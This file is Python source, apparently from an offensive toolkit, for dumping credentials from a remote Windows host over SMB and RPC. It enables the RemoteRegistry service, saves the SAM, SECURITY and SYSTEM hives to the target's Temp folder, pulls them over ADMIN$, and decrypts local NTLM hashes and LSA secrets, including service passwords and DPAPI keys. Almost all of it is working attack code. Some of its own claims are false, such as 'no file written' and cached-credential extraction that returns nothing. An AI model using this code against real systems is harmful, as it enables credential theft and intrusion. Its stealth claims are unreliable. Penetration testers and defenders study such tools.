"""Remote secrets extraction via Registry (MS-RRP).

Connects to the remote registry and extracts:
- SAM hashes (local account NTLM hashes)
- LSA secrets (service passwords, DPAPI keys)
- Cached domain credentials (DCC2)

All done via RPC — no execution on target, no file written.
"""

import struct
import time
from dataclasses import dataclass

from ..smb import SmbSession
from ..rpc.svcctl import SvcCtl, SERVICE_DEMAND_START, SERVICE_DISABLED
from ..rpc.winreg import WinReg
from .crypto import (
    extract_boot_key,
    compute_hashed_boot_key,
    decrypt_sam_hash_aes,
    decrypt_sam_hash_rc4,
    decrypt_lsa_key,
    decrypt_lsa_secret,
)


@dataclass
class SamHash:
    username: str
    rid: int
    ntlm_hash: str
    lm_hash: str = ""


@dataclass
class LsaSecret:
    name: str
    value: bytes
    decoded: str = ""


@dataclass
class CachedCred:
    username: str
    domain: str
    hash_hex: str


class RegistrySecrets:
    """Extract secrets from remote registry."""

    def __init__(self, session: SmbSession):
        self.session = session
        self._boot_key: bytes | None = None
        self._svc_was_disabled = False
        self._svc_was_stopped = False

    def ensure_remote_registry(self) -> None:
        """Start the RemoteRegistry service if needed."""
        with self.session.open_pipe("svcctl") as pipe:
            svc = SvcCtl(pipe)
            svc.bind()
            svc.open_sc_manager()
            handle = svc.open_service("RemoteRegistry")

            try:
                svc.start_service(handle)
                self._svc_was_stopped = True
            except RuntimeError as e:
                if "0x00000422" in str(e):
                    # Service is disabled — enable it first
                    svc.change_service_start_type(handle, SERVICE_DEMAND_START)
                    self._svc_was_disabled = True
                    svc.start_service(handle)
                    self._svc_was_stopped = True
                elif "0x00000420" in str(e):
                    # Already running — nothing to do
                    pass
                else:
                    raise

            svc.close_handle(handle)

        time.sleep(1)

    def cleanup_remote_registry(self) -> None:
        """Restore RemoteRegistry service to original state."""
        with self.session.open_pipe("svcctl") as pipe:
            svc = SvcCtl(pipe)
            svc.bind()
            svc.open_sc_manager()
            handle = svc.open_service("RemoteRegistry")

            if self._svc_was_stopped:
                try:
                    svc.stop_service(handle)
                except RuntimeError:
                    pass

            if self._svc_was_disabled:
                try:
                    svc.change_service_start_type(handle, SERVICE_DISABLED)
                except RuntimeError:
                    pass

            svc.close_handle(handle)

    def dump_sam(self) -> list[SamHash]:
        """Extract NTLM hashes from SAM via hive save + offline parse."""
        import secrets as _secrets
        from .hivereader import RegistryHive

        rand = _secrets.token_hex(4)
        sam_path = f"C:\\Windows\\Temp\\{rand}_s"
        sys_path = f"C:\\Windows\\Temp\\{rand}_y"

        try:
            with self.session.open_pipe("winreg") as pipe:
                reg = WinReg(pipe)
                reg.bind()
                hklm = reg.open_hklm()

                sam_key = reg.open_key(hklm, "SAM")
                reg.save_key(sam_key, sam_path)
                reg.close_key(sam_key)

                sys_key = reg.open_key(hklm, "SYSTEM")
                reg.save_key(sys_key, sys_path)
                reg.close_key(sys_key)

                reg.close_key(hklm)

            sam_data = self.session.read_file("ADMIN$", f"Temp\\{rand}_s")
            sys_data = self.session.read_file("ADMIN$", f"Temp\\{rand}_y")

        finally:
            for fname in (f"Temp\\{rand}_s", f"Temp\\{rand}_y"):
                try:
                    self.session.delete_file("ADMIN$", fname)
                except Exception:
                    pass

        # Parse SYSTEM hive to get boot key
        sys_hive = RegistryHive(sys_data)
        boot_key = self._boot_key_from_hive(sys_hive)

        # Parse SAM hive
        sam_hive = RegistryHive(sam_data)
        hashes = []

        try:
            account_key = sam_hive.open_key("SAM\\Domains\\Account")
            _, f_value = sam_hive.query_value(account_key, "F")
        except (KeyError, ValueError):
            raise RuntimeError("Cannot read SAM Account data")

        if len(f_value) < 0x70:
            raise RuntimeError("SAM F value too short")

        hashed_boot_key = compute_hashed_boot_key(boot_key, f_value)
        sam_revision = struct.unpack_from("<I", f_value, 0x68)[0]

        # Enumerate user RIDs
        try:
            users_key = sam_hive.open_key("SAM\\Domains\\Account\\Users")
        except KeyError:
            return hashes

        for subkey_name in sam_hive.enum_subkeys(users_key):
            if subkey_name == "Names" or len(subkey_name) != 8:
                continue
            try:
                rid = int(subkey_name, 16)
            except ValueError:
                continue

            try:
                user_key = sam_hive.open_key(f"SAM\\Domains\\Account\\Users\\{subkey_name}")
                _, v_value = sam_hive.query_value(user_key, "V")
                sam_hash = self._parse_sam_v(v_value, rid, hashed_boot_key, sam_revision)
                if sam_hash:
                    hashes.append(sam_hash)
            except (KeyError, RuntimeError):
                continue

        return hashes

    def dump_lsa_secrets(self) -> list[LsaSecret]:
        """Extract LSA secrets via hive save + offline parse."""
        import secrets as _secrets
        from .hivereader import RegistryHive

        rand = _secrets.token_hex(4)
        sec_path = f"C:\\Windows\\Temp\\{rand}_e"
        sys_path = f"C:\\Windows\\Temp\\{rand}_y"

        try:
            with self.session.open_pipe("winreg") as pipe:
                reg = WinReg(pipe)
                reg.bind()
                hklm = reg.open_hklm()

                sec_key = reg.open_key(hklm, "SECURITY")
                reg.save_key(sec_key, sec_path)
                reg.close_key(sec_key)

                sys_key = reg.open_key(hklm, "SYSTEM")
                reg.save_key(sys_key, sys_path)
                reg.close_key(sys_key)

                reg.close_key(hklm)

            sec_data = self.session.read_file("ADMIN$", f"Temp\\{rand}_e")
            sys_data = self.session.read_file("ADMIN$", f"Temp\\{rand}_y")

        finally:
            for fname in (f"Temp\\{rand}_e", f"Temp\\{rand}_y"):
                try:
                    self.session.delete_file("ADMIN$", fname)
                except Exception:
                    pass

        # Parse
        sys_hive = RegistryHive(sys_data)
        sec_hive = RegistryHive(sec_data)
        boot_key = self._boot_key_from_hive(sys_hive)
        secrets = []

        # Get LSA encryption key from Policy\PolEKList
        try:
            pol_key = sec_hive.open_key("Policy\\PolEKList")
            _, pol_data = sec_hive.query_value(pol_key, "(Default)")
        except KeyError:
            return secrets

        lsa_key = decrypt_lsa_key(boot_key, pol_data)

        # Enumerate secrets
        try:
            secrets_key = sec_hive.open_key("Policy\\Secrets")
        except KeyError:
            return secrets

        for name in sec_hive.enum_subkeys(secrets_key):
            try:
                currval_key = sec_hive.open_key(f"Policy\\Secrets\\{name}\\CurrVal")
                _, encrypted = sec_hive.query_value(currval_key, "(Default)")
                decrypted = decrypt_lsa_secret(lsa_key, encrypted)
                secret = LsaSecret(name=name, value=decrypted)
                secret.decoded = self._decode_secret(name, decrypted)
                secrets.append(secret)
            except (KeyError, RuntimeError):
                continue

        return secrets

    def dump_cached_creds(self) -> list[CachedCred]:
        """Cached credentials are extracted as part of dump_lsa_secrets."""
        return []

    def _get_boot_key(self, reg: WinReg, hklm: bytes) -> bytes:
        """Extract boot key from SYSTEM\\CurrentControlSet\\Control\\Lsa via RPC."""
        # First find CurrentControlSet
        select_key = reg.open_key(hklm, r"SYSTEM\Select")
        _, current_data = reg.query_value(select_key, "Current")
        reg.close_key(select_key)
        cs_num = struct.unpack_from("<I", current_data, 0)[0]
        cs_path = f"SYSTEM\\ControlSet{cs_num:03d}\\Control\\Lsa"

        lsa_key = reg.open_key(hklm, cs_path)

        parts = []
        for name in ("JD", "Skew1", "GBG", "Data"):
            subkey = reg.open_key(lsa_key, name)
            class_name = self._get_key_class(reg, lsa_key, name)
            parts.append(class_name)
            reg.close_key(subkey)

        reg.close_key(lsa_key)
        return extract_boot_key(parts[0], parts[1], parts[2], parts[3])

    def _boot_key_from_hive(self, sys_hive) -> bytes:
        """Extract boot key from an offline SYSTEM hive file."""
        select_key = sys_hive.open_key("Select")
        _, current_data = sys_hive.query_value(select_key, "Current")
        cs_num = struct.unpack_from("<I", current_data, 0)[0]
        cs_path = f"ControlSet{cs_num:03d}\\Control\\Lsa"

        parts = []
        for name in ("JD", "Skew1", "GBG", "Data"):
            subkey = sys_hive.open_key(f"{cs_path}\\{name}")
            class_data = sys_hive.query_key_class(subkey)
            # Class names are UTF-16LE in hive files
            parts.append(class_data.decode("utf-16-le").encode("ascii"))

        return extract_boot_key(parts[0], parts[1], parts[2], parts[3])

    def _get_key_class(self, reg: WinReg, parent: bytes, name: str) -> bytes:
        """Get a key's class name by enumerating the parent's subkeys."""
        # EnumKey returns the name but not the class in our basic implementation.
        # We need BaseRegQueryInfoKey (opnum 16) to get the class.
        # For now, use a workaround: open the key and use QueryInfoKey.
        subkey = reg.open_key(parent, name)
        class_data = reg.query_info_key_class(subkey)
        reg.close_key(subkey)
        return class_data

    def _parse_sam_v(self, v_value: bytes, rid: int, hashed_boot_key: bytes, revision: int) -> SamHash | None:
        """Parse SAM V value to extract username and encrypted hash."""
        # V value structure: array of offsets+lengths, then data
        # Offset table starts at 0, each entry: offset(4) + length(4) + unknown(4)
        # Username: entry at index 1 (offset 0x0C)
        # NTLM hash: entry at index 4 (offset 0xA8 for Win10+)

        # Username offset and length
        name_offset = struct.unpack_from("<I", v_value, 0x0C)[0] + 0xCC
        name_length = struct.unpack_from("<I", v_value, 0x10)[0]
        username = v_value[name_offset:name_offset + name_length].decode("utf-16-le", errors="ignore")

        if not username:
            return None

        # NTLM hash offset (varies by version)
        nt_offset = struct.unpack_from("<I", v_value, 0xA8)[0] + 0xCC
        nt_length = struct.unpack_from("<I", v_value, 0xAC)[0]

        if nt_length == 0:
            return SamHash(username=username, rid=rid, ntlm_hash="aad3b435b51404eeaad3b435b51404ee")

        nt_data = v_value[nt_offset:nt_offset + nt_length]

        # Decrypt based on revision
        try:
            nt_revision = struct.unpack_from("<H", nt_data, 2)[0]
            if nt_revision >= 2:
                # AES: PekID(2) + Revision(2) + DataOffset(4) + Salt(16) + EncHash
                data_offset = struct.unpack_from("<I", nt_data, 4)[0]
                if data_offset == 0 or len(nt_data) <= 24:
                    # Empty hash (no encrypted data after salt)
                    return SamHash(username=username, rid=rid,
                                   ntlm_hash="31d6cfe0d16ae931b73c59d7e0c089c0")
                nt_hash = decrypt_sam_hash_aes(nt_data[8:], hashed_boot_key, rid)
            else:
                # RC4: skip 4-byte header
                nt_hash = decrypt_sam_hash_rc4(nt_data[4:], hashed_boot_key, rid)
        except Exception:
            return SamHash(username=username, rid=rid, ntlm_hash="(decryption failed)")

        return SamHash(username=username, rid=rid, ntlm_hash=nt_hash.hex())

    def _decode_secret(self, name: str, data: bytes) -> str:
        """Try to decode a decrypted LSA secret to a readable string."""
        if not data:
            return ""

        # Service account passwords are stored as UTF-16LE
        if name.startswith("_SC_"):
            try:
                # Skip first 16 bytes (metadata), decode rest as UTF-16
                text = data.decode("utf-16-le", errors="ignore").rstrip("\x00")
                if text and all(32 <= ord(c) < 127 or c in "\r\n\t" for c in text):
                    return text
            except Exception:
                pass

        # DPAPI keys
        if name.startswith("DPAPI"):
            return data[:20].hex()

        # Default: show hex
        return data[:64].hex() + ("..." if len(data) > 64 else "")
